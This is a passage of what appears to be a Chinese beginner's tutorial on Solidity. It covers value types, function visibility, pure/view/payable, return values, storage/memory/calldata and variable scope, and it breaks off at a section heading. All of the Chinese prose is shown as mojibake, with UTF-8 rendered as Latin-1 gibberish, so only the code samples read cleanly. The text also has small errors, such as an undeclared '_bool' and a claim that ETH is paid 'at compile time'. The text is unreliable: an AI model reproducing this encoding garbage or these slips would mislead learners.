è¯­å¥ä»¥åˆ†å·ï¼ˆ;ï¼‰ç»“å°¾ã€‚ 1pragma solidity ^0.8.4; ç¬¬3-4è¡Œæ˜¯åˆçº¦éƒ¨åˆ†ï¼Œç¬¬3è¡Œåˆ›å»ºåˆçº¦ï¼ˆcontractï¼‰ï¼Œå¹¶å£°æ˜åˆçº¦çš„åå­— HelloWeb3ã€‚ç¬¬4è¡Œæ˜¯åˆçº¦çš„å†…å®¹ï¼Œæˆ‘ä»¬å£°æ˜äº†ä¸€ä¸ªstringï¼ˆå­—ç¬¦ä¸²ï¼‰å˜é‡_stringï¼Œå¹¶ç»™ä»–èµ‹å€¼ â€œHello Web3!â€ã€‚ 123contract HelloWeb3&#123; string public _string = &quot;Hello Web3!&quot;;&#125; 1. æ•°å€¼ç±»å‹solidity ä¸­çš„å˜é‡ç±»å‹ æ•°å€¼ç±»å‹ï¼šå¸ƒå°”å‹ï¼Œæ•´æ•°å‹ï¼Œè¿™ç±»å˜é‡èµ‹å€¼çš„æ—¶å€™ç›´æ¥ä¼ é€’å‚æ•° å¼•ç”¨ç±»å‹ï¼š åŒ…æ‹¬æ•°ç»„å’Œç»“æ„ä½“ï¼Œè¿™ç±»å˜é‡å ç”¨ç©ºé—´å¤§ï¼Œèµ‹å€¼çš„æ—¶å€™ç›´æ¥ä¼ é€’åœ°å€ï¼ˆç±»ä¼¼äºæŒ‡é’ˆï¼‰ æ˜ å°„ç±»å‹ï¼šsolidityé‡Œçš„å“ˆå¸Œè¡¨ å‡½æ•°ç±»å‹ï¼šsolidityæ–‡æ¡£é‡ŒæŠŠå‡½æ•°å½’åˆ°æ•°å€¼ç±»å‹ï¼Œå®ƒå’Œå…¶ä»–ç±»å‹å·®åˆ«å¾ˆå¤§ 1.1 å¸ƒå°”ç±»å‹å¸ƒå°”ç±»å‹æ˜¯äºŒå€¼å˜é‡ï¼Œå–å€¼ä¸ºtrue æˆ– false 12// å¸ƒå°”å€¼bool public flag = true; ä»£ç ï¼š 1234567891011// å¸ƒå°”è¿ç®— //å–é bool public flag1 = !flag; // false //ä¸ bool public flag2 = _bool &amp;&amp; flag1; // false //æˆ– bool public flag3 = _bool || flag1; // true //ç›¸ç­‰ bool public flag4 = flag == flag1; // false //ä¸ç›¸ç­‰ bool public flag5 = flag != flag1; // true tips: å€¼å¾—æ³¨æ„çš„æ˜¯ï¼š&amp;&amp; å’Œ || è¿ç®—ç¬¦å’ŒJavaä¸­çš„ &amp;&amp; å’Œ || ä¸€æ ·çš„ç”¨æ³•å’Œä½¿ç”¨è§„åˆ™,éƒ½æ˜¯éµå¾ªçŸ­è·¯è§„åˆ™ï¼Œè¿™æ„å‘³ç€ï¼Œå‡å¦‚å­˜åœ¨f(x) || g(y) çš„è¡¨è¾¾å¼ï¼Œå¦‚æœ f(x) æ˜¯trueï¼Œg(y) ä¸ä¼šè¢«è®¡ç®—ï¼Œå³ä½¿å®ƒå’Œ f(x) çš„ç»“æœæ˜¯ç›¸åçš„ï¼ŒåŒç† &amp;&amp; ä¹Ÿæ˜¯ï¼Œf(x) &amp;&amp; g(y) è¡¨è¾¾å¼è‹¥f(x) ä¸ºfalse ,åˆ™ä¸ä¼šæ‰§è¡Œg(y)ã€‚ 1.2. æ•´å‹æ•´å‹æ˜¯solidity ä¸­çš„æ•´æ•°ï¼Œæœ€å¸¸ç”¨çš„åŒ…æ‹¬ 1234// æ•´å‹ int public _int = -1; // æ•´æ•°ï¼ŒåŒ…æ‹¬è´Ÿæ•° uint public _uint = 1; // æ­£æ•´æ•° uint256 public _number = 20220330; // 256ä½æ­£æ•´æ•° å¸¸ç”¨çš„æ•´æ•°è¿ç®—ç¬¦åŒ…æ‹¬ï¼š æ¯”è¾ƒè¿ç®—ç¬¦ï¼ˆè¿”å›å¸ƒå°”å€¼ï¼‰: &gt;, &lt;, &#x3D;&#x3D;, &gt;&#x3D;, &lt;&#x3D;, !&#x3D; ç®—æ•°è¿ç®—ç¬¦ï¼š+, -, *, &#x2F;, %, **(å¹‚) ä»£ç ï¼š 12345// æ•´æ•°è¿ç®—uint256 public _number1 = _number + 1; // +ï¼Œ-ï¼Œ*ï¼Œ/uint256 public _number2 = 2**2; // æŒ‡æ•°uint256 public _number3 = 7 % 2; // å–ä½™æ•°bool public _numberbool = _number2 &gt; _number3; // æ¯”å¤§å° 1.3. åœ°å€ç±»å‹åœ°å€ç±»å‹(address) å­˜å‚¨ä¸€ä¸ª 20 å­—èŠ‚çš„å€¼ï¼ˆä»¥å¤ªåŠåœ°å€çš„å¤§å°ï¼‰ã€‚åœ°å€ç±»å‹ä¹Ÿæœ‰æˆå‘˜å˜é‡ï¼Œå¹¶ä½œä¸ºæ‰€æœ‰åˆçº¦çš„åŸºç¡€ã€‚æœ‰æ™®é€šçš„åœ°å€å’Œå¯ä»¥è½¬è´¦ETHçš„åœ°å€ (payable)ã€‚payableçš„åœ°å€æ‹¥æœ‰balanceå’Œ transfer() ä¸¤ä¸ªæˆå‘˜ï¼Œæ–¹ä¾¿æŸ¥è¯¢ETHä½™é¢ä»¥åŠè½¬è´¦ã€‚ 12345// åœ°å€address public _address = 0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71;address payable public _address1 = payable(_address);//payable addressï¼Œå¯ä»¥è½¬è´¦ã€æŸ¥ä½™é¢// åœ°å€ç±»å‹çš„æˆå‘˜uint256 public balance = _address1.balance; // balance of address 1.4. å®šé•¿å­—èŠ‚æ•°ç»„å­—èŠ‚æ•°ç»„bytes åˆ†ä¸¤ç§ï¼Œä¸€ç§å®šé•¿ï¼ˆbyte, bytes8, bytes32), å¦ä¸€ç§ä¸å®šé•¿ã€‚å®šé•¿çš„å±äºæ•°å€¼ç±»å‹ï¼Œä¸å®šé•¿çš„æ˜¯å¼•ç”¨ç±»å‹ã€‚å®šé•¿bytes å¯ä»¥å­˜ä¸€äº›æ•°æ®ï¼Œæ¶ˆè€—gasæ¯”è¾ƒå°‘ã€‚ 123// å›ºå®šé•¿åº¦çš„å­—èŠ‚æ•°ç»„bytes32 public _byte32 = &quot;MiniSolidity&quot;; bytes1 public _byte = _byte32[0]; MiniSolidity å˜é‡ä»¥å­—èŠ‚çš„æ–¹å¼å­˜å‚¨è¿›å˜é‡_byte32, è½¬åŒ–ä¸º16è¿›åˆ¶ä¸ºï¼š 0x4d696e69536f6c69646974790000000000000000000000000000000000000000 _bytes å˜é‡å­˜å‚¨ _bytes32 çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œä¸º0x4dã€‚ 1.5 æšä¸¾ enumæšä¸¾(enum) æ˜¯solidity ä¸­ç”¨æˆ·å®šä¹‰çš„æ•°æ®çƒˆæ€§ã€‚å®ƒä¸»è¦ç”¨äº uint åˆ†é…åç§°ï¼Œä½¿ç¨‹åºæ˜“äºé˜…è¯»å’Œç»´æŠ¤ã€‚å®ƒä¸c è¯­è¨€ä¸­çš„enum ç±»ä¼¼ï¼Œä½¿ç”¨åç§°æ¥ä»£æ›¿ä» 0 å¼€å§‹çš„uintï¼š 1234// ç”¨enumå°†uint 0ï¼Œ 1ï¼Œ 2è¡¨ç¤ºä¸ºBuy, Hold, Sellenum ActionSet &#123; Buy, Hold, Sell &#125;// åˆ›å»ºenumå˜é‡ actionActionSet action = ActionSet.Buy; å®ƒå¯ä»¥æ˜¾å¼çš„å’Œuintç›¸äº’è½¬æ¢ï¼Œå¹¶ä¼šæ£€æŸ¥è½¬æ¢çš„æ­£æ•´æ•°æ˜¯å¦åœ¨æšä¸¾çš„é•¿åº¦å†…ï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼š 1234// enumå¯ä»¥å’Œuintæ˜¾å¼çš„è½¬æ¢function enumToUint() external view returns(uint)&#123; return uint(action);&#125; 2. å‡½æ•°ç±»å‹2.1 solidityä¸­çš„å‡½æ•° è¯¦æƒ…å¯å‚è€ƒ å®˜æ–¹æ–‡æ¡£1function &lt;function name&gt; (&lt;parameter types&gt;) &#123;internal|external|public|private&#125; [pure|view|payable] [returns (&lt;return types&gt;)] tips: æ–¹æ‹¬å·ä¸­çš„æ˜¯å¯å†™å¯ä¸å†™çš„å…³é”®å­— funtion: så£°æ˜å‡½æ•°æ—¶çš„å›ºå®šç”¨æ³•ï¼Œæƒ³å†™å‡½æ•°ï¼Œå°±è¦ä»¥function å…³é”®å­—å¼€å¤´ ï¼š å‡½æ•°å (): åœ†æ‹¬å·é‡Œå†™å‡½æ•°çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¦è¾“å…¥åˆ°å‡½æ•°çš„å˜é‡ç±»å‹å’Œåå­—ã€‚ {internal|external|public|private}ï¼šå‡½æ•°å¯è§æ€§è¯´æ˜ç¬¦ï¼Œä¸€å…±4ç§ã€‚æ²¡æ ‡æ˜å‡½æ•°ç±»å‹çš„ï¼Œé»˜è®¤internalã€‚ public ï¼š å†…éƒ¨å¤–éƒ¨éƒ½å¯è§ã€‚ï¼ˆä¹Ÿå¯ç”¨äºä¿®é¥°çŠ¶æ€å˜é‡ï¼Œpublicå˜é‡ä¼šè‡ªåŠ¨ç”Ÿæˆgetterå‡½æ•°ï¼Œç”¨äºæŸ¥è¯¢æ•°å€¼ï¼‰ã€‚ privateï¼š åªèƒ½ä»æœ¬åˆçº¦å†…éƒ¨è®¿é—®ï¼Œç»§æ‰¿çš„åˆçº¦ä¹Ÿä¸èƒ½ç”¨ï¼ˆä¹Ÿå¯ç”¨äºä¿®é¥°çŠ¶æ€å˜é‡ï¼‰ã€‚ external: åªèƒ½ä»åˆçº¦å¤–éƒ¨è®¿é—®ï¼ˆä½†æ˜¯å¯ä»¥ç”¨this.f()æ¥è°ƒç”¨ï¼Œf æ˜¯å‡½æ•°åã€‚ - å¯ä»¥ç›´æ¥è°ƒç”¨å†…éƒ¨å‡½æ•°ï¼Œå³ internalä¿®é¥°çš„å‡½æ•°: - - ä¸èƒ½ç›´æ¥è°ƒç”¨å¤–éƒ¨å‡½æ•°ï¼Œå³externalä¿®é¥°çš„å‡½æ•°ï¼Œè¦ç”¨ this. æ¥è°ƒç”¨ï¼š - - å¦åˆ™å°±ä¼šæŠ¥é”™ï¼š - - internal: åªèƒ½ä»åˆçº¦å†…éƒ¨è®¿é—®ï¼Œç»§æ‰¿çš„åˆçº¦å¯ä»¥ç”¨ï¼ˆä¹Ÿå¯ç”¨äºä¿®é¥°çŠ¶æ€å˜é‡ï¼‰ã€‚ - internal ä¿®é¥°çš„å‡½æ•°å¯ä»¥ç›´æ¥è¢«åˆçº¦å†…çš„å‡½æ•°è°ƒç”¨ï¼Œinternal å’Œ external ä¿®é¥°çš„å‡½æ•°éƒ½å¯ä»¥ - è°ƒç”¨internal ä¿®é¥°çš„ï¼š - - è°ƒç”¨external ä¿®é¥°çš„ï¼š - - internal å¯ä»¥è°ƒç”¨ external ä¿®é¥°çš„å‡½æ•°ï¼Œï¼ˆä»¥æˆ‘ç›®å‰çš„æ°´å¹³æˆ‘è¿˜æ˜¯ä¸èƒ½å‘ç°è¿™æ ·åšæœ‰ä»€ä¹ˆç”¨å¤„ï¼‰ï¼Œåªèƒ½é€šè¿‡ this.f() ã€fæ˜¯æ–¹æ³•åã€‘è°ƒç”¨ - å¦åˆ™å°±ä¼šæŠ¥é”™ï¼š - - æ¼”ç¤ºä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract inter_exer &#123; address public owner; string public value; constructor() payable &#123; // å°†owner çš„å€¼è®¾ç½®ä¸ºå½“å‰åˆçº¦åœ°å€ owner = address(this); &#125;// å†…éƒ¨å‡½æ•° function inter() internal returns(string memory) &#123; value = &quot;This is inter()&quot;; return value; &#125;// è°ƒç”¨å†…éƒ¨å‡½æ•° function useInter() internal &#123; // this.exter(); // é€šè¿‡this. è°ƒç”¨external ä¿®é¥°çš„å‡½æ•° inter(); &#125;// å¤–éƒ¨å‡½æ•° function exter() external returns(string memory) &#123; // useInter(); // string memory _exter = &quot;This is exter()&quot;; value = &quot;This is exter()&quot;; return value;&#125;// è°ƒç”¨å¤–éƒ¨å‡½æ•° function useExter() external &#123; useInter(); // this.exter(); &#125;&#125; [pure | view | payable] : å†³å®šå‡½æ•°æƒé™&#x2F; åŠŸèƒ½çš„å…³é”®å­—ã€‚payable (å¯æ”¯ä»˜çš„) ï¼Œå¸¦ç€å®ƒçš„å‡½æ•°ï¼Œè¿è¡Œçš„æ—¶å€™å¯ä»¥ç»™åˆçº¦è½¬å…¥ETH åœ¨ä»¥å¤ªåŠä¸­ï¼Œå¦‚ä¸‹è¯­å¥è¢«è§†ä¸ºä¸Šé“¾ - å†™å…¥çŠ¶æ€å˜é‡ - é‡Šæ”¾äº‹ä»¶ - åˆ›å»ºå…¶ä»–åˆåŒ - ä½¿ç”¨selfdestruct - é€šè¿‡è°ƒç”¨å‘é€ä»¥å¤ªå¸ - è°ƒç”¨ä»»ä½•æœªæ ‡è®°view å’Œ pure çš„å‡½æ•° - ä½¿ç”¨ä½çº§è°ƒç”¨ï¼ˆlow-level class) - ä½¿ç”¨åŒ…å«æŸäº›æ“ä½œç çš„å†…è”æ±‡ç¼– é©¬é‡Œå¥¥æ’å›¾ï¼Œåˆçº¦ä¸­çš„è½¬å°å˜é‡ï¼ˆå­˜å‚¨åœ¨é“¾ä¸Šï¼‰æ¯”ä½œå…¬ä¸»ï¼Œä¸‰ä¸ªå…³é”®å­—è¡¨ç¤ºä¸åŒçš„è§’è‰² pureï¼šä¸­æ–‡ç¿»è¯‘ä¸ºâ€œçº¯â€ï¼Œåœ¨solidityä¸­ç†è§£ä¸ºâ€œçº¯ç‰›å­â€ã€‚åŒ…å«pureå…³é”®å­—çš„å‡½æ•°ï¼Œä¸èƒ½è¯»å–ä¹Ÿä¸èƒ½å†™å…¥å­˜å‚¨åœ¨é“¾ä¸Šçš„è½¬å°å˜é‡ã€‚å°±åƒå°æ€ªä¸€æ ·ï¼Œçœ‹ä¸åˆ°æ‘¸ä¸ç€å…¬ä¸»ã€‚ viewï¼šä¸­æ–‡ç¿»è¯‘ä¸ºâ€œçœ‹â€ï¼Œåœ¨solidityä¸­ç†è§£ä¸ºâ€œçœ‹å®¢â€ã€‚åŒ…å«view å…³é”®å­—çš„å‡½æ•°ï¼Œèƒ½è¯»å–ä½†ä¸èƒ½å†™å…¥çŠ¶æ€å˜é‡ã€‚ç±»ä¼¼é©¬é‡Œå¥¥ï¼Œèƒ½çœ‹åˆ°å…¬ä¸»ï¼Œä½†ç»ˆç©¶æ˜¯çœ‹å®¢ï¼Œä¸èƒ½å…¥æ´æˆ¿ã€‚ é»˜è®¤å€¼ï¼ˆå³ä¸å¸¦view å’Œ pureï¼‰ï¼šå‡½æ•°æ—¢å¯ä»¥è¯»å–ä¹Ÿå¯ä»¥å†™å…¥çŠ¶æ€å˜é‡ã€‚ç±»ä¼¼é©¬é‡Œå¥¥ä¸­ çš„bossï¼Œ å¯ä»¥å¯¹å…¬ä¸»ä¸ºæ‰€æ¬²ä¸ºğŸ¤ªğŸ¤ªğŸ¤ªã€‚ pure å’Œ view çš„åŒºåˆ« åœ¨åˆçº¦ä¸­å®šä¹‰ä¸€ä¸ªçŠ¶æ€å˜é‡ number &#x3D; 5 1234// SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract FunctionTypes&#123; uint256 public number = 5; å®šä¹‰ä¸€ä¸ªadd()å‡½æ•°ï¼Œæ¯æ¬¡è°ƒç”¨ï¼Œæ¯æ¬¡ç»™number + 1 1234// é»˜è®¤function add() external&#123; number = number + 1;&#125; å¦‚æœadd()åŒ…å«äº†pureå…³é”®å­—ï¼Œä¾‹å¦‚ function add() pure externalï¼Œå°±ä¼šæŠ¥é”™ã€‚å› ä¸ºpureï¼ˆçº¯çº¯ç‰›é©¬ï¼‰æ˜¯ä¸é…è¯»å–åˆçº¦é‡Œçš„çŠ¶æ€å˜é‡çš„ï¼Œæ›´ä¸é…æ”¹å†™ã€‚é‚£pureå‡½æ•°èƒ½åšäº›ä»€ä¹ˆï¼Ÿä¸¾ä¸ªä¾‹å­ï¼Œä½ å¯ä»¥ç»™å‡½æ•°ä¼ é€’ä¸€ä¸ªå‚æ•° _numberï¼Œç„¶åè®©ä»–è¿”å› _number+1 1234// pure: çº¯çº¯ç‰›é©¬function addPure(uint256 _number) external pure returns(uint256 new_number)&#123; new_number = _number+1;&#125; view ä¿®é¥°çš„å‡½æ•°ï¼Œå¯ä»¥æŸ¥çœ‹ä½†æ˜¯ä¸èƒ½è°ƒç”¨ 1234 // view: çœ‹å®¢function divView (uint256 _number) external view returns(uint256 new_number)&#123; new_number = _number-1; &#125; payable ä¿®é¥°çš„å‡½æ•°æ˜¯å¯ä»¥ç›´æ¥ç»™åˆçº¦æ”¯ä»˜ethçš„ å¦‚ï¼Œæˆ‘ç”¨payable ä¿®é¥°æˆ‘çš„æ„é€ å‡½æ•°ï¼Œåœ¨ç¼–è¯‘çš„æ—¶å€™ä¾¿å¯ä»¥ç»™åˆçº¦æ”¯ä»˜ethäº† [returns()]ï¼š å‡½æ•°è¿”å›çš„å˜é‡ç±»å‹å’Œåç§°ã€‚ å¦‚æœåœ¨returns() çš„ ï¼ˆï¼‰ ä¸­å£°æ˜äº†è¿”å›å€¼çš„åå­—ï¼Œä¸”ä¸å‡½æ•°ä½“å†…æ‰€éœ€è¿”å›çš„å˜é‡ç›¸åŒï¼Œåˆ™å¯ä»¥ä¸éœ€è¦åœ¨å‡½æ•°ä½“å†…å†™return è¯­å¥, ä¾‹å¦‚ï¼š 123function divView (uint256 _number) external view returns(uint256 new_number)&#123; new_number = _number-1; &#125; 3. å‡½æ•°è¾“å‡º3.1 è¿”å›å€¼return å’Œ returnssolidity æœ‰ä¸¤ä¸ªå…³é”®å­—ä¸å‡½æ•°è¾“å‡ºç›¸å…³ï¼šreturn å’Œ returnsï¼Œ ä»–ä»¬çš„åŒºåˆ«åœ¨äºï¼š returns åŠ åœ¨å‡½æ•°ååé¢ï¼Œç”¨äºå£°æ˜è¿”å›çš„å˜é‡ç±»å‹åŠå˜é‡åï¼› return ç”¨äºå‡½æ•°ä¸»ä½“ä¸­ï¼Œè¿”å›æŒ‡å®šçš„å˜é‡ã€‚ 1234// è¿”å›å¤šä¸ªå˜é‡function returnMultiple() public pure returns(uint256, bool, uint256[3] memory)&#123; return(1, true, [uint256(1),2,5]); &#125; è¿™æ®µä»£ç ä¸­ï¼ŒreturnMultiple() å‡½æ•°ä¸­å°†æœ‰å¤šä¸ªè¾“å‡ºå€¼ï¼šreturns(uint256, bool, uint256[3] memory)ï¼Œ æ¥ç€æˆ‘ä»¬åœ¨å‡½æ•°ä¸»ä½“ä¸­ç”¨ return(1, true, [uint256(1),2,5]) ç¡®å®šäº†è¿”å›å€¼ã€‚ å…¶ä¸­å¯¹ uint256[3] memory å’Œ [uint256(1),2,5] çš„ç†è§£å’ŒæŸ¥é˜…èµ„æ–™ï¼š æ²ƒæ—¥â€¦. è¿™ä¸ªæ˜¯æ•°ç»„ï¼Œæˆ‘ç«Ÿç„¶æ²¡çœ‹å‡ºæ¥ï¼Œæ•°ç»„åˆ°åé¢å†çœ‹ï¼Œæ…¢æ…¢æ¥å˜›ğŸ§ğŸ§ğŸ§ 3.2 å‘½åå¼è¿”å›æˆ‘ä»¬å¯ä»¥åœ¨returns ä¸­æ ‡æ˜è¿”å›å˜é‡çš„åç§°ï¼Œè¿™æ ·solidityä¼šè‡ªåŠ¨ç»™è¿™äº›å˜é‡åˆå§‹åŒ–ï¼Œå¹¶ä¸”è‡ªåŠ¨è¿”å›è¿™äº›å‡½æ•°çš„å€¼ï¼Œä¸éœ€è¦åŠ returnã€‚ 123456// å‘½åå¼è¿”å›function returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123; _number = 2; _bool = false; _array = [uint256(3),2,1];&#125; ä»£ç ä¸­ï¼Œreturns(uint256 _number, bool _bool, uint256[3] memory _array) å£°æ˜äº†è¿”å›å˜é‡ç±»å‹ä»¥åŠå˜é‡åã€‚è¿™æ ·ï¼Œæˆ‘ä»¬åœ¨ä¸»ä½“ä¸­åªéœ€ç»™å˜é‡ _numberï¼Œ _boolï¼Œ _array èµ‹å€¼å°±å¯ä»¥è‡ªåŠ¨è¿”å›äº†ã€‚ ä¹Ÿå¯ä»¥åœ¨å‘½åæ ¼å¼è¿”å›ä¸­ç”¨ return æ¥è¿”å›å˜é‡ï¼š 1234// å‘½åå¼è¿”å›ï¼Œä¾ç„¶æ”¯æŒreturnfunction returnNamed2() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123; return(1, true, [uint256(1),2,5]);&#125; 3.3 è§£æ„å¼èµ‹å€¼solidity ä½¿ç”¨ç»“æ„å¼èµ‹å€¼çš„è§„åˆ™ï¼Œ æ”¯æŒè¯»å–å‡½æ•°çš„å…¨éƒ¨æˆ– éƒ¨åˆ†è¿”å›å€¼ è¯»å–æ‰€æœ‰å‡½æ•°è¿”å›å€¼ï¼šå£°æ˜å˜é‡ï¼Œå¹¶ä¸”å°†è¦èµ‹äºˆçš„å˜é‡ç”¨ , å·éš”å¼€ï¼ŒæŒ‰é¡ºåºæ’åˆ— 1234uint256 _number;bool _bool;uint256[3] memory _array;(_number, _bool, _array) = returnNamed(); è¯»å–éƒ¨åˆ†è¿”å›å€¼ï¼šå£°æ˜è¦è¯»å–çš„è¿”å›å€¼å¯¹åº”çš„å˜é‡ï¼Œä¸è¯»å–çš„ç•™ç©ºã€‚ä¸‹é¢è¿™æ®µä»£ç ï¼Œæˆ‘ä»¬åªè¯»å– _bool ï¼Œ è€Œä¸è¯»å–è¿”å›çš„ _number å’Œ _arrary ï¼š 1(, _bool2, ) = returnNamed(); 4. å˜é‡æ•°æ®å­˜å‚¨å’Œä½œç”¨åŸŸtips: å¼•ç”¨ç±»å‹ ï¼š åŒ…æ‹¬æ•°ç»„ï¼ˆarraryï¼‰ï¼Œç»“æ„ä½“ï¼ˆstructï¼‰å’Œ æ˜ å°„ï¼ˆmappingï¼‰ï¼Œè¿™ç±»å˜é‡å ç©ºé—´å¤§ï¼Œèµ‹å€¼æ—¶å€™ç›´æ¥ä¼ é€’åœ°å€ï¼ˆç±»ä¼¼æŒ‡é’ˆï¼‰ã€‚ç”±äºè¿™ç±»å˜é‡æ¯”è¾ƒå¤æ‚ï¼Œå ç”¨å­˜å‚¨ç©ºé—´å¤§ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨æ˜¯å¿…é¡»è¦å£°æ˜æ•°æ®å­˜å‚¨çš„ä½ç½®ã€‚ 4.1 æ•°æ®ä½ç½®solidity æ•°æ®å­˜å‚¨ä½ç½®æœ‰ä¸‰å¤§ç±»ï¼šstorageï¼Œ memoryï¼Œ å’Œ calldataã€‚ä¸åŒå­˜å‚¨ä½ç½®çš„gas æˆæœ¬ä¸åŒã€‚storageç±»å‹çš„æ•°æ®å­˜åœ¨é“¾ä¸Šï¼Œç±»ä¼¼è®¡ç®—æœºçš„ç¡¬ä»¶ï¼Œæ¶ˆè€—gaså¤šï¼›memory å’Œ calldata ç±»å‹çš„ä¸´æ—¶å­˜åœ¨å†…å­˜é‡Œï¼Œæ¶ˆè€—gaså°‘ã€‚å¤§è‡´ç”¨æ³•ï¼š storageï¼šåˆçº¦ä¸­çš„çŠ¶æ€å˜é‡é»˜è®¤éƒ½æ˜¯storageï¼Œ å­˜å‚¨åœ¨é“¾ä¸Š memoryï¼š å‡½æ•°é‡Œçš„å‚æ•°å’Œä¸´æ—¶å˜é‡ä¸€èˆ¬ç”¨memoryï¼Œå­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œä¸ä¸Šé“¾ calldataï¼š å’Œmemory ç±»ä¼¼ï¼Œå­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œä¸ä¸Šé“¾ã€‚ä¸memoruyçš„ä¸åŒç‚¹åœ¨äºcalldata å˜é‡ä¸èƒ½ä¿®æ”¹ï¼ˆimmutableï¼‰ï¼Œä¸€èˆ¬ç”¨äºå‡½æ•°çš„å‚æ•°ã€‚ ä¾‹å­ï¼š 12345function fCalldata(uint[] calldata _x) public pure returns(uint[] calldata)&#123; //å‚æ•°ä¸ºcalldataæ•°ç»„ï¼Œä¸èƒ½è¢«ä¿®æ”¹ // _x[0] = 0 //è¿™æ ·ä¿®æ”¹ä¼šæŠ¥é”™ return(_x);&#125; tips: calldataå˜é‡ ä¸ä¸Šé“¾ï¼Œä¸èƒ½ä¿®æ”¹ã€‚ 4.2 æ•°æ®ä½ç½®å’Œèµ‹å€¼è§„åˆ™åœ¨ä¸åŒå­˜å‚¨ç±»å‹ç›¸äº’èµ‹å€¼çš„æ—¶å€™ï¼Œæœ‰æ—¶ä¼šäº§ç”Ÿç‹¬ç«‹çš„å‰¯æœ¬ï¼ˆä¿®æ”¹æ–°å˜é‡ä¸ä¼šå½±å“åŸå˜é‡ï¼‰ï¼Œä¼˜åŠ¿ä¼šäº§ç”Ÿå¼•ç”¨ï¼ˆä¿®é¥°æ–°å˜é‡ä¼šå½±å“åŸå˜é‡ï¼‰ã€‚è§„åˆ™å¦‚ä¸‹ï¼š 4.2.1 storageï¼šï¼ˆåˆçº¦çš„çŠ¶æ€å˜é‡ï¼‰èµ‹å€¼ç»™æœ¬åœ°storage ï¼ˆå‡½æ•°é‡Œçš„ï¼‰æ—¶å€™ï¼Œä¼šåˆ›å»ºå¼•ç”¨ï¼Œæ”¹å˜æ–°å˜é‡ä¼šå½±å“åŸå˜é‡ã€‚ä¾‹å­ï¼š 123456789uint[] x = [1,2,3]; // çŠ¶æ€å˜é‡ï¼šæ•°ç»„ x function fStorage() public&#123; //å£°æ˜ä¸€ä¸ªstorageçš„å˜é‡ xStorageï¼ŒæŒ‡å‘xã€‚ä¿®æ”¹xStorageä¹Ÿä¼šå½±å“x uint[] storage xStorage = x; xStorage[0] = 100;&#125;// æ­¤æ—¶ x æ•°ç»„ä¸­çš„å€¼ä¸º [100,2,3] tips: ç±»ä¼¼äºJavaä¸­çš„ å¼•ç”¨ç±»å‹æ•°ç»„ï¼Œéƒ½æŒ‡å‘åŒä¸€ä»½åœ°å€ï¼Œåªè¦ä¸€å¤„å‘ç”Ÿæ”¹å˜ï¼Œåˆ™å¼•ç”¨è¯¥åœ°å€çš„å˜é‡çš„å€¼éƒ½ä¼šå‘ç”Ÿæ”¹å˜ 4.2.2 storage èµ‹å€¼ç»™memoryï¼Œ ä¼šåˆ›å»ºç‹¬ç«‹çš„å‰¯æœ¬ï¼Œä¿®æ”¹å…¶ä¸­ä¸€ä¸ªä¸ä¼šå½±å“å¦ä¸€ä¸ªï¼›åä¹‹äº¦ç„¶ã€‚ä¾‹å­ï¼š 12345678910uint[] x = [1,2,3]; // çŠ¶æ€å˜é‡ï¼šæ•°ç»„ xfunction fMemory() public view&#123; //å£°æ˜ä¸€ä¸ªMemoryçš„å˜é‡xMemoryï¼Œå¤åˆ¶xã€‚ä¿®æ”¹xMemoryä¸ä¼šå½±å“x uint[] memory xMemory = x; xMemory[0] = 100; xMemory[1] = 200; uint[] memory xMemory2 = x; xMemory2[0] = 300;&#125; tipsï¼šç±»ä¼¼äºJavaä¸­çš„åŸºæœ¬æ•°æ®ç±»å‹çš„æ•°ç»„çš„åŸç†ï¼Œä¼šå¤åˆ¶ä¸€ä»½ç›¸åŒçš„å€¼ 4.2.3 memory èµ‹å€¼ç»™memoryï¼Œ ä¼šåˆ›å»ºå¼•ç”¨ï¼Œæ”¹å˜æ–°å˜é‡ä¼šå½±å“åŸå˜é‡ 4.2.3 å…¶ä»–æƒ…å†µï¼Œå˜é‡èµ‹å€¼ç»™ storageï¼Œ ä¼šåˆ›å»ºç‹¬ç«‹çš„å‰¯æœ¬ï¼Œä¿®æ”¹å…¶ä¸­ä¸€ä¸ªä¸ä¼šå½±å“å¦ä¸€ä¸ª 4.3 å˜é‡çš„ä½œç”¨åŸŸsolidityä¸­å˜é‡æŒ‰ä½œç”¨åŸŸåˆ’åˆ†ä¸ºä¸‰ç§ï¼Œåˆ†åˆ«æ˜¯çŠ¶æ€å˜é‡ï¼ˆstate variableï¼‰ï¼Œå±€éƒ¨å˜é‡ï¼ˆlocal variableï¼‰ å’Œå…¨å±€å˜é‡ï¼ˆglobal variableï¼‰ 4.3.1 çŠ¶æ€å˜é‡ æ˜¯æ•°æ®å­˜å‚¨åœ¨é“¾ä¸Šçš„å˜é‡ï¼Œæ‰€æœ‰åˆçº¦å†…å‡½æ•°éƒ½å¯ä»¥è®¿é—®ï¼Œgas æ¶ˆè€—é«˜.çŠ¶æ€å˜é‡åœ¨åˆçº¦å†…ã€å‡½æ•°å¤–å£°æ˜ï¼š 1234contract Variables &#123; uint public x = 1; uint public y; string public z; åœ¨å‡½æ•°é‡Œæ›´æ”¹çŠ¶æ€å˜é‡çš„å€¼ï¼š 123456function foo() external&#123; // å¯ä»¥åœ¨å‡½æ•°é‡Œæ›´æ”¹çŠ¶æ€å˜é‡çš„å€¼ x = 5; y = 2; z = &quot;0xAA&quot;;&#125; 4.3.2 å±€éƒ¨å˜é‡ æ˜¯ä»…åœ¨å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­æœ‰æ•ˆçš„å˜é‡ï¼Œå‡½æ•°é€€å‡ºåï¼Œå˜é‡æ— æ•ˆã€‚å±€éƒ¨å˜é‡çš„æ•°æ®å­˜å‚¨åœ¨å†…å­˜é‡Œï¼Œä¸ä¸Šé“¾ï¼Œgasä½ã€‚å±€éƒ¨å˜é‡åœ¨å‡½æ•°å†…å£°æ˜ï¼š 123456function bar() external pure returns(uint)&#123; uint xx = 1; uint yy = 3; uint zz = xx + yy; return(zz);&#125; 4.3.3 